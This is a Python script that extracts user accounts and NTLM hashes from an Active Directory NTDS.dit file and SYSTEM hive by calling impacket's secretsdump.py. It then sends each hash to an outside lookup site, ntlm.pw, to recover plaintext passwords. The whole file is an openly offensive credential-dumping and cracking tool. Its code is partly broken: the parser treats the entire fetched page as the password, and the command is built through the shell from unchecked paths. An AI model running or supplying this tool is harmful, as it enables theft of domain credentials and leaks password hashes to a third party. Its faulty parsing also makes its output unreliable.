import re
import requests
from bs4 import BeautifulSoup
import os
import subprocess
from impacket.examples.secretsdump import NTDSHashes

class NTDSExtractor:
    def __init__(self, ntds_file, system_file):
        self.ntds_file = ntds_file
        self.system_file = system_file
        self.output_file = 'secretsdump_output.txt'

    def extract_users_and_hashes(self):
        self._run_secretsdump()
        return self._parse_output_file()

    def _run_secretsdump(self):
        command = f'secretsdump.py -ntds {self.ntds_file} -system {self.system_file} -outputfile {self.output_file}'
        subprocess.run(command, shell=True, check=True)

    def _parse_output_file(self):
        with open(self.output_file, 'r') as file:
            lines = file.readlines()

        regex = re.compile(r'(?P<domain>[^\\]+)\\(?P<user>[^:]+):\d+:[a-f0-9]{32}:(?P<ntlm_hash>[a-f0-9]{32})')

        users_and_hashes = []
        for line in lines:
            match = regex.search(line)
            if match:
                domain = match.group('domain')
                user = match.group('user')
                ntlm_hash = match.group('ntlm_hash')
                users_and_hashes.append({'user': f"{domain}\\{user}", 'ntlm_hash': ntlm_hash})

        return users_and_hashes


class NTLMHashChecker:
    @staticmethod
    def check_ntlm_hash(ntlm_hash):
        url = f"https://ntlm.pw/{ntlm_hash}"
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')

        password_tag = soup
        if password_tag:
            password = password_tag.text.strip()
            return password
        return None


if __name__ == "__main__":
    # Example usage
    ntds_file = 'path_to_your_ntds.dit'
    system_file = 'path_to_your_SYSTEM'

    extractor = NTDSExtractor(ntds_file, system_file)
    users_and_hashes = extractor.extract_users_and_hashes()

    for entry in users_and_hashes:
        ntlm_hash = entry['ntlm_hash']
        password = NTLMHashChecker.check_ntlm_hash(ntlm_hash)
        if password:
            print(f"User: {entry['user']}, NTLM Hash: {ntlm_hash}, Password: {password}")
        else:
            print(f"User: {entry['user']}, NTLM Hash: {ntlm_hash}, Password: Not found")
